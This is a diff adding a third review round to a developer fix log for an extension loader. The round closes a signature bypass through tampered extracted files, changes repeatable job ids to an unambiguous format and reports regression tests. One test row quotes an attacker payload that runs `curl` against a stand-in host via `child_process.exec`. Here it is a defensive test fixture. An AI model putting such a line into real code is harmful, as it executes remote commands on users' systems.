@@ -732,3 +732,184 @@ connection, and the admin list path via `listAll`.
 
 The shared `breeze-postgres-test` container was reused via the idempotent
 `test:docker:up` path; `test:docker:down -v` was never run.
+
+---
+
+## Round 3 — extracted-tree reuse verification + unambiguous job ids
+
+A focused re-review of round 2 found that the signature-bypass closed in
+`4fab86888` was still reachable by a shorter route, plus a residual
+mis-attribution in the repeatable-jobId parser.
+
+### F1 (merge-blocking) — the reuse shortcut was the only unverified path into `import()`
+
+`4fab86888` added `assertVerifiedMemberBytes` so `extractVerifiedPayload`
+re-hashes each archive member against `bundle.files` before writing. But the
+function short-circuited before ever reaching that code:
+
+```ts
+if (await pathExists(path.join(dest, '.verified'))) return dest;   // :242 and :268
+```
+
+`dest` is `<storeRoot>/extracted/sha256-<hex>`, and `storeRoot` is
+`resolveArtifactStoreRoot()` — the same mounted volume the threat model names as
+writable by a compromised sibling container or any non-root process. So instead
+of tampering with the archive (which IS re-verified every boot, since
+`ports.verify` runs before extract), an attacker overwrites the extracted server
+entry directly. The `.verified` marker then makes extraction a no-op,
+`loadServerEntry` `import()`s the tampered file, and **no hash is ever
+computed** — same arbitrary-code-execution outcome for strictly less work.
+
+**Approach chosen: re-verify, then re-extract on mismatch (not re-extract
+always, and not throw).**
+
+A new private `isExtractedTreeVerified(bundle, dest)` reuses
+`assertVerifiedMemberBytes` — deliberately NOT a second verification path — to
+re-hash every member listed in `bundle.files` against the bytes on disk. It also
+walks the tree and rejects any **extra** file, because a verified member may
+`require()` a sibling, so an unsigned file in the tree is reachable code even
+when no member's own hash changed. It returns `false`, never throws, for a
+missing marker, a missing/unreadable member, a hash mismatch, or an extra file.
+
+`false` means "fall through to a clean re-extraction" rather than "abort":
+re-extraction is cheap and idempotent, so a tampered or partial tree **self-heals**
+instead of bricking boot. Throwing outright would let anyone with write access
+to the volume convert a tamper into a permanent denial of service on a *required*
+extension. Both `.verified` check sites are covered — the fast path at the top
+and the concurrent-commit path in the `rename` catch both now call
+`isExtractedTreeVerified` instead of `pathExists`.
+
+Ordering detail: the rejected tree is removed only **after** a good replacement
+is fully staged in the temp dir, so a re-extraction that itself fails leaves the
+previous state untouched rather than leaving nothing behind.
+
+The happy path still does no writes — it only reads and hashes; a regression test
+asserts the entry file's inode is unchanged across a reuse, proving no full
+re-extract/rename occurred.
+
+Attribution + sanitization: the mismatch is logged against
+`bundle.manifest.name` with a fixed string — no raw bytes, no host paths, no
+exception text. Any hard failure still flows through the reconciler's `extract`
+phase into `recordSanitizedFailure`.
+
+Placement: verification happens before `extractVerifiedPayload` returns, and
+`dest` is the only handle a consumer ever receives (`loadServerEntry` is called
+with the returned path), so no caller can read the tree ahead of the check.
+
+### F2 — `extension:<name>:<job>` (separator chosen: `:`)
+
+`resolveRepeatableExtensionName` resolved a repeatable's owner by testing
+shortest-first hyphen-boundary prefixes of `extension-<name>-<job>` against the
+local registry. That mis-attributes on a hyphen collision: with `demo` known and
+`demo-extra` **absent** from this replica, `extension-demo-extra-sweep` resolved
+to `owner='demo'` (non-null), so `desired.get(id)` was `undefined` and the **live
+foreign schedule was deleted** — precisely the bug round 2's guard existed to
+close, surviving in the collision case. Longest-first has the mirror failure;
+this format cannot be parsed exactly at all.
+
+Rather than keep parsing an ambiguous id, the id is now unambiguous:
+`extension:<name>:<job>`.
+
+**Why `:` is safe.** `packages/extension-sdk/src/manifest.ts` constrains both
+halves and neither admits a colon:
+
+- extension name — `NAME_RE = /^[a-z][a-z0-9-]{1,31}$/`
+- job name — `identifier` / `IDENTIFIER_RE = /^[a-z][a-z0-9]*(?:[._-][a-z0-9]+)*$/`
+
+So the id is exactly splittable. `resolveRepeatableExtensionName` becomes a pure
+parse (`id: string) => string | null`) — it no longer takes an `isKnown`
+predicate and no longer needs the registry to disambiguate, which is what makes
+mis-attribution structurally impossible rather than merely unlikely. The
+ownership prefix filter is now `'extension:'`, and `extensionJobId` emits the new
+form.
+
+**Rationale recorded in the code:** this id is effectively a **wire format** — it
+is the key BullMQ persists in Redis. Changing it pre-merge costs nothing; after
+deploy it would need a migration to reap old-format repeatables. That is why it
+was done now rather than deferred.
+
+Both ownership directions from prior rounds still hold and are still covered:
+extension **absent** from this replica's registry → schedule **preserved**;
+**present-but-disabled** → schedule **removed**.
+
+### F3 — included (DB-authoritative reap, conservative)
+
+Included; it stayed within budget (~15 lines). With F2 in place a repeatable
+whose owner no replica knows would never be reaped, so removing an extension from
+deployment config fleet-wide would leave its cron firing forever, enqueueing a
+no-op each tick.
+
+`sync` now lazily reads `store.listAll()` **once per sync**, and only when it
+actually encounters an `extension:*` entry whose owner is not in the local
+registry. An entry is removed only on a **positive confirmation of absence** —
+i.e. the read succeeded and returned no `installed_extensions` row for that
+owner. Every uncertain case preserves:
+
+- `listAll` port absent → preserve (the port is declared `Partial<…>` on
+  `JobHostStore`, so existing test stubs keep their old preserve-only behavior)
+- `listAll` threw → preserve
+- row present → preserve
+
+### Regression tests + pre-fix evidence
+
+Pre-fix evidence was gathered by `git stash`-ing **only the two source files**
+(`jobHost.ts`, `reconciler.ts`) and running the new tests against round-2 source.
+
+| Test | File | Pre-fix |
+|---|---|---|
+| `re-extracts instead of reusing an extracted tree whose bytes were tampered with on disk` | `src/extensions/reconciler.test.ts` | **FAIL** — got the attacker payload `require("child_process").exec("curl evil.example");` where the signed `exports.x = 1;` was expected |
+| `re-extracts when an extra file appears in a previously verified tree` | `src/extensions/reconciler.test.ts` | **FAIL** — smuggled `server/evil.js` still present after re-extract |
+| `reuses an untampered verified tree without rewriting it` | `src/extensions/reconciler.test.ts` | passes both sides (guards the fix against over-correcting into an unconditional re-extract) |
+| `preserves a foreign repeatable whose extension name shares a hyphen prefix with a known one` | `src/extensions/jobHost.test.ts` | see note below — **FAIL** proven against the pre-fix id format |
+| `reaps an unknown owner only when the store confirms it has no installed_extensions row` | `src/extensions/jobHost.test.ts` | **FAIL** — `removed` was `[]`, expected `['gone-key']` |
+| `never reaps an unknown owner when the store read fails (uncertainty preserves)` | `src/extensions/jobHost.test.ts` | passes both sides (pins the fail-closed direction) |
+
+Plus six existing `jobHost.test.ts` cases updated from `extension-<name>-<job>`
+to `extension:<name>:<job>`; all failed pre-fix against the new source and pass
+post-fix, which is itself the evidence that the id change is threaded through
+`extensionJobId`, the prefix filter, and the resolver consistently.
+
+**Note on the F2 collision test.** Because F2 *changes the id format*, the
+committed test necessarily uses the new `extension:demo-extra:sweep` id, which
+pre-fix code skips entirely (it does not match the old `extension-` prefix) and
+so passes vacuously. To prove the bug is real rather than assumed, a temporary
+throwaway spec was run against the stashed pre-fix source using the **old**
+format, `extension-demo-extra-sweep`, with only `demo` in the registry:
+
+```
+FAIL  src/__f2proof.test.ts > DELETES extension-demo-extra-sweep when only demo is known
+  - Expected: []
+  + Received: [ "foreign-key" ]
+```
+
+The pre-fix resolver deleted the foreign replica's live schedule, confirming the
+mis-attribution. The throwaway spec was deleted; the committed test pins the
+post-fix behavior.
+
+### Verification
+
+| Command | Result |
+|---|---|
+| `pnpm -F @breeze/api test:run src/extensions src/routes/extensionsAdmin.test.ts src/services/aiTools.test.ts scripts/breezectl.test.ts` | **18 files, 236 tests passed** |
+| `pnpm -F @breeze/api test:integration --run …/extensionState… …/extensionMigrator…` (Docker :5433) | **2 files, 6 tests passed** |
+| `NODE_OPTIONS=--max-old-space-size=8192 pnpm exec tsc --noEmit --project tsconfig.json` (from `apps/api`) | **exit 0, 0 errors** |
+| `pnpm exec eslint src/extensions/{jobHost,reconciler}{,.test}.ts` | **exit 0, 0 errors** |
+| `pnpm -F @breeze/api build` | **Build success in 393ms** (`dist/index.cjs` 13.34 MB) |
+
+Scoped run of just the two changed specs: **2 files, 25 tests passed** (9 of
+those 25 failed pre-fix).
+
+The shared `breeze-postgres-test` container was reused (already running);
+`test:docker:down -v` was never run. `test:docker:up` reported a port conflict on
+`6380` for `breeze-redis-test` — that is another worktree already holding the
+port, and the two integration specs above are Postgres-only, so it did not affect
+the run.
+
+### Follow-up noted, NOT changed (out of scope)
+
+**Connection-pool headroom.** `createEnabledGate` runs per extension request, and
+`asSystem` now takes a **second** pooled connection while the request transaction
+still holds its first. This is a repo-wide idiom, but this is its first hot
+*per-request* use, so the effective pool ceiling for extension traffic is halved.
+Left untouched deliberately; worth sizing before extension routes carry real
+load.
